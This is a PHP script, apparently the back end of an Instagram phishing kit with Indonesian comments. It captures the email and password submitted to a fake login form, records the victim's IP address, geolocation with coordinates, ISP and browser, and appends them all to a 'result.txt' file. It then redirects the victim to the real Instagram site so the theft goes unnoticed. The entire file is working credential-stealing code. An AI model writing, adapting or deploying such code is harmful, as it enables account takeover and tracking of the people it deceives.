<?php 
include 'alexBackEnd/UserAgent.php';
include 'alexBackEnd/daerah.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['pass'];

$benua = $alex['continent'];
$negara = $alex['country'];
$region = $alex['regionName'];
$city = $alex['city'];
$latitude = $alex['lat'];
$longtitude = $alex['lon'];
$timezone = $alex['timezone'];
$perdana = $alex['isp'];
$ipaddress = $alex['query'];
$platform = $infos['platfrm_name'];
$osversi = $infos['platfrm_vers'];
$browser = $infos['browser_name'];
			    

// MENGAMBIL KONTROL
include 'alexBackEnd/bendera.php';

		    
$myfile = fopen("result.txt", "a") or die("Unable to open file!");
$txt = "=== Instagram Result === \n\n";
fwrite($myfile, $txt);
$txt = "Email: $email \n\n";
fwrite($myfile, $txt);
$txt = "Password: $password \n\n";
fwrite($myfile, $txt);
$txt = "Daerah: $negara / $region / $city / $latitude / $longtitude / $timezone \n";
fwrite($myfile, $txt);
$txt = "User Agents: $perdana / $ipaddress / $platform / $osversi / $browser \n\n\n\n";
fwrite($myfile, $txt);
$txt = "====================== \n\n";
fwrite($myfile, "-".$txt);
fclose($myfile);
 echo "<meta http-equiv='refresh' content='0;url=https://www.instagram.com/' />";
?>
